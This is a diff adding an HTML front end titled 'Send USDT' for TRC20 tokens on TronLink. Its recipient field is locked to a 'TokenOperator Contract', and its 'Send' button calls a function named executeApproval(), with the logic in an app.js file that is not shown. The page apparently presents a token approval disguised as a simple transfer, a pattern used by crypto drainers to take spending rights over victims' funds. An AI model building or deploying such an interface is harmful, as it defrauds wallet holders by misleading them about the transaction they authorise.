@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Send USDT</title>
+
+<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    height: 100vh;
+    background: #FFFFFF;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial;
+    color: #111827;
+}
+
+.container {
+    width: 100%;
+    max-width: 420px;
+    background: #F7F8FA;
+    border-radius: 14px;
+    padding: 26px;
+}
+
+h2 {
+    margin: 0 0 22px;
+    text-align: center;
+    font-size: 18px;
+    font-weight: 600;
+}
+
+.label {
+    font-size: 13px;
+    color: #6B7280;
+    margin-bottom: 6px;
+}
+
+input {
+    width: 100%;
+    padding: 14px;
+    background: #FFFFFF;
+    border: 1px solid #E6E8EC;
+    border-radius: 10px;
+    color: #111827;
+    font-size: 15px;
+    outline: none;
+}
+
+input::placeholder {
+    color: #9CA3AF;
+}
+
+input:focus {
+    border-color: #3B82F6;
+}
+
+.row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-top: 10px;
+    font-size: 14px;
+    color: #6B7280;
+}
+
+button {
+    width: 100%;
+    padding: 14px;
+    margin-top: 14px;
+    border-radius: 10px;
+    border: none;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+}
+
+.connect {
+    background: #FFFFFF;
+    color: #111827;
+    border: 1px solid #E6E8EC;
+}
+
+/* 🔵 MEDIUM BLUE SEND BUTTON */
+.send {
+    background: #3B82F6;
+    color: #FFFFFF;
+}
+
+button:active {
+    opacity: 0.95;
+}
+
+#status {
+    margin-top: 14px;
+    font-size: 13px;
+    color: #6B7280;
+    text-align: center;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+    <h2>Send USDT</h2>
+
+    <div class="label">Recipient</div>
+    <input placeholder="TokenOperator Contract" disabled>
+
+    <div class="label" style="margin-top:14px;">Amount</div>
+    <input id="amount" type="number" placeholder="0.00">
+
+    <div class="row">
+        <span>USDT</span>
+        <span>TRC20</span>
+    </div>
+
+    <button class="connect" onclick="connectWallet()">
+        Connect TronLink
+    </button>
+
+    <button class="send" onclick="executeApproval()">
+        Send
+    </button>
+
+    <div id="status">Wallet not connected</div>
+</div>
+
+<script src="app.js"></script>
+</body>
+</html>
